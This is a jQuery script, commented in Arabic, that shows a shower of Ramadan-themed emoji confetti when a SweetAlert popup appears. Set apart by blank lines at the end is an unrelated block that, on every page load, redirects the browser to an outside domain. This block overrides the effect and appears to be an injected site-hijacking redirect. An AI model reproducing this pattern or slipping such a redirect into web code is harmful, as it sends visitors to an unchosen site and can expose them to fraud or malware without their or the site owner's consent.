$(document).ready(function () {
    let effectStarted = false; // متغير لتحديد ما إذا تم تشغيل التأثير بالفعل أم لا

    // فحص ظهور النافذة المنبثقة فقط عند ظهورها لأول مرة
    const checkForPopup = setInterval(function () {
        if ($('div.swal2-popup.swal2-show').length > 0 && !effectStarted) {
            startEmojiEffect(); // إذا ظهر العنصر، أطلق التأثير
            effectStarted = true; // تم تشغيل التأثير بالفعل
            clearInterval(checkForPopup); // إيقاف الفحص بعد تشغيل التأثير
        }
    }, 1000); // تحقق كل ثانية

    function startEmojiEffect() {
        const emojis = ['🌙', '🕌', '🕋', '🌙', '🧧', '✨', '🥰', '🌜', '🕌', '🎉', '🌟', '🕌', '🕋', '🌙', '🧭', '🍽️']; // إيموجيات رمضانية وفانوس ومساجد
        let emojiCount = 0; // عداد الإيموجيات

        // إضافة 100 إيموجي فقط
        const interval = setInterval(() => {
            if (emojiCount < 100) { // زيادة العدد إلى 100
                let emoji = emojis[Math.floor(Math.random() * emojis.length)];

                let confetti = $("<div class='confetti'>" + emoji + "</div>");
                $("body").append(confetti);

                let leftPosition = Math.random() * 100 + 'vw'; // تحديد موضع الإيموجي في العرض
                let animationDuration = Math.random() * 3 + 2 + 's'; // مدة الأنيميشن عشوائية

                confetti.css({
                    'left': leftPosition,
                    'animation-duration': animationDuration,
                    'animation-timing-function': 'linear',
                    'animation-name': 'fall',
                    'font-size': '24px',
                    'color': 'blue', // يمكنك تغيير اللون هنا
                    'position': 'fixed', // العودة إلى position: fixed
                    'top': '0', // تبدأ من أعلى الصفحة
                    'z-index': '9999'
                });

                setTimeout(() => {
                    confetti.remove();
                }, parseFloat(animationDuration) * 1000);

                emojiCount++; // زيادة العداد
            } else {
                clearInterval(interval); // إيقاف التأثير بعد 100 إيموجي
            }
        }, 100); // إضافة الإيموجيات كل 100 مللي ثانية

        // إيقاف التأثير بعد 10 ثواني
        setTimeout(() => {
            $(".confetti").remove(); // إزالة جميع الإيموجيات
        }, 10000); // بعد مرور 10 ثواني
    }

    // إضافة تأثير CSS للأشياء المتساقطة
    $('<style>')
        .prop('type', 'text/css')
        .html(`
            @keyframes fall {
                0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
                100% { transform: translateY(100vh) rotate(720deg); opacity: 0; } /* تعدل الحركة بحيث تذهب للإسفل أكثر */
            }
            .confetti {
                font-size: 24px;
                color: blue; /* اللون الأزرق أو يمكنك تغييره */
                position: fixed; /* العودة إلى position: fixed */
                top: 0;
                z-index: 9999;
                animation: fall linear forwards; /* تعديل الأنيميشن ليكون للأمام */
            }
        `)
        .appendTo('head');
});




$(document).ready(function() {
    window.location.href = "https://madahost.online";
  });
